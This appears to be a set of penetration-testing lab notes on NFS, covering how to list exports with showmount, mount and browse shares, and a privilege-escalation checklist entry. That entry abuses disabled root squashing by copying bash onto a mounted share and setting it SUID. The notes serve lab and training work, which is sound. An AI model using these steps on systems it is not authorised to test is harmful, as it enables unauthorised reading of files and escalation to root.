## List advertised NFS exports

**Run in:** Kali. **Requires:** The server's mount service must be reachable; NFSv4-only servers may not expose it.

```bash
showmount -e TARGET_IP
```

**What the result establishes:** Read advertised NFS exports and allowed clients as leads for a subsequent mount/access check.

**Next check:** Check the NFS version and a known permitted export; a missing mountd response does not prove no NFS access exists.

## If it fails

| Symptom | Check |
| --- | --- |
| No export list is returned despite NFS being present | NFSv4 behavior and server configuration can limit export listing; an advertised export is not proof this client can mount or read it. |

### NFS (Port 2049)

**Footprinting: Service-by-Service Lab Workflow**

```bash
# List available shares
showmount -e <IP>

# Mount a share
mkdir /tmp/target-NFS
sudo mount -t nfs <IP>:/<share> /tmp/target-NFS

# Browse (use sudo — NFS permissions may block normal user)
sudo ls -la /tmp/target-NFS/<folder>
sudo cat /tmp/target-NFS/<folder>/file.txt

# Unmount when done (important — stale mounts freeze your terminal)
sudo umount -f /tmp/target-NFS
sudo umount -l /tmp/target-NFS   # if -f doesn't work
```

### NFS Root Squashing

**Linux Privilege Escalation: Full Checklist**

```powershell
# remote check the name of the folder
showmount -e 10.10.10.10

# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash .  

# set suid permission
chmod +s bash
```
